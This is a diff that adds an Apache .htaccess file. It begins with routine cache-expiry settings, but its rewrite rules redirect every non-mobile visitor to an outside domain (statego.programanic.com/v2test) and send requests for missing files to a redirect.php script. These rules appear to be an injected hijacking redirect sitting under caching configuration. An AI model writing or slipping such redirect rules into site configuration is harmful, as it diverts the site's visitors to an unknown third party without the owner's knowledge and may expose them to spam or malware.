@@ -1,0 +1,21 @@
+<ifModule mod_expires.c>
+ExpiresActive On
+ExpiresByType text/css "access plus 7 days"
+ExpiresByType image/bmp "access plus 10 days"
+ExpiresByType image/gif "access plus 10 days"
+ExpiresByType image/jpg "access plus 10 days"
+ExpiresByType image/jpeg "access plus 10 days"
+ExpiresByType image/png "access plus 10 days"
+ExpiresByType text/js "access plus 10 days"
+ExpiresByType text/javascript "access plus 10 days"
+ExpiresByType text/x-javascript "access plus 10 days"
+ExpiresByType application/javascript "access plus 10 days"
+ExpiresByType application/x-javascript "access plus 10 days"
+</ifModule>
+RewriteEngine Off
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} !(iPhone|iPod|Android.*Mobile|Windows.*Phone|BlackBerry)
+RewriteRule ^(.*)$ https://statego.programanic.com/v2test/$1 [R,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !redirect\.php
+RewriteRule ^(.*)$ redirect.php?nf=$1 [L]
